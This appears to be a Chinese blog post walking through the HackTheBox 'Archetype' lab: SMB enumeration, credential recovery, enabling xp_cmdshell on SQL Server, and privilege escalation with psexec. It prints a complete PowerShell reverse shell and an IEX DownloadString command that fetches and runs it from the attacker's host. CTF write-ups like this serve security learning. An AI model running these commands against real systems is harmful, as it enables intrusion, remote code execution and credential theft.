---
title: HackTheBox-Archetype
date: 2021-07-13 17:05:21
categories:
- 渗透测试
tags:
- HackTheBox
---

## 实验环境

![](https://i.loli.net/2021/07/12/m1YO5GTBC6jqoPt.png)

## 实验过程

### 信息收集

#### nmap扫描：

```
nmap -sC -sV 10.10.10.27
```

-sC：使用默认脚本进行扫描，等同于–script=default
-sV：探测开启的端口来获取服务、版本信息

![](https://i.loli.net/2021/07/12/zqbrwsZEfTkXcOY.png)

可以看到开放端口有四个：135、139、445、1433，1433是SQL Server数据库默认使用的端口，445是文件共享协议（SMB）默认使用的端口

#### 445端口匿名访问

测试445端口的SMB服务是否支持匿名访问，没有经过权限配置可能默认允许所有人无需身份认证来匿名访问共享资源，使用smbclient来访问samba服务器的共享资源：

```
smbclient -N -L //10.10.10.27/
```

-N：匿名登录
-L：获取共享资源列表

![](https://i.loli.net/2021/07/12/NSm3xJlXt7sMAK4.png)

可以看到存在一个backups目录，使用smbclient来访问：

```
smbclient -N //10.10.10.27/backups
```

![](https://i.loli.net/2021/07/12/A8cunJbwH3BphVX.png)

发现存在一个prod.dtsConfig文件,使用get命令下载到本地，查看文件内容，可以看到数据库配置信息：

![](https://i.loli.net/2021/07/12/o17Mu3zfOnsZ5x8.png)

### impacket工具的使用

> 下载地址：https://github.com/SecureAuthCorp/impacket/tree/master

**安装**：

进入impacket目录，执行：

```
pip install .
```

![](https://i.loli.net/2021/07/12/RGXP5Qjl3h6a7WM.png)

用前面获得的账号和密码登录：

```
mssqlclient.py sql_svc@10.10.10.27 -windows-auth
```

![](https://i.loli.net/2021/07/12/JyWYrKpMLvNV1P2.png)

判断当前是否拥有sysadmin权限：

```
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![](https://i.loli.net/2021/07/12/zZmAQyGdqRb5cfC.png)

返回值是1，代表true，说明当前用户具有sysadmin权限，能够在靶机上使用SQL Server的xp_cmdshell来进行远程代码执行

### 使用数据库调用系统命令

依次写入：

```
EXEC sp_configure 'Show Advanced Options', 1;			\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项
reconfigure;											\\确认上面的操作
sp_configure;											\\查看当前sp_configure配置情况
EXEC sp_configure 'xp_cmdshell', 1						\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令
reconfigure;											\\确认上面的操作
xp_cmdshell "whoami" 									\\在靶机上调用cmdshell执行whoami
```

执行结束后，SQL会返回当前数据库进程的操作系统用户为archetype\sql_svc

![](https://i.loli.net/2021/07/12/aIbOdf4lZ71eHyq.png)

### 获得操作系统普通用户权限

我们已经可以在数据库执行系统命令，接下来我们需要反弹一个操作系统shell；

在桌面新建一个powershell的反弹shell文件shell.ps1（**注意将其中的ip修改为HTB分配的ip**）

代码如下：

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.55",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

下面我们搭建一个http服务器，让靶机下载我们的shell.ps1文件；

因为我的shell.ps1文件在桌面，所以也在桌面终端执行搭建http服务器的命令：

```
python3 -m http.server 80
```

![](https://i.loli.net/2021/07/12/BPoClYzDI3T18qk.png)

然后开启一个监听端口，用来接收反弹的shell：

```
nc -lvvp 443
```

![](https://i.loli.net/2021/07/12/SiAqEx789zZYwKJ.png)

接着在数据库shell中执行如下命令，反弹shell：

```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.55/shell.ps1\");"
```

![](https://i.loli.net/2021/07/12/fHnUJF6gtxzmbEO.png)

### 获取普通用户权限的flag

在nc接收的shell中直接执行下面的命令：

```
type C:\Users\sql_svc\Desktop\user.txt
```

![](https://i.loli.net/2021/07/12/L9siVhJlfBKYGam.png)

### 获取系统权限用户的flag

使用下面的命令来访问PowerShell历史记录文件：

```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![](https://i.loli.net/2021/07/12/Dc6TqQ7bRgAkK9d.png)

发现administrator用户登录后将共享文件夹\Archetype\backups映射到T盘，后面是administrator用户名和它的密码，可以使用Impacket中的psexec.py来提权：

```
psexec.py administrator@10.10.10.27
```

输入上面获得的密码就可以成功提权

![](https://i.loli.net/2021/07/12/BZmn8vYqEpbcW1k.png)

执行如下命令获得flag：

```
type C:\Users\Administrator\Desktop\root.txt
```

![](https://i.loli.net/2021/07/12/lBtDMgWAsP2nTLb.png)



> 参考：
>
> https://blog.csdn.net/qq_45951598/article/details/115269502
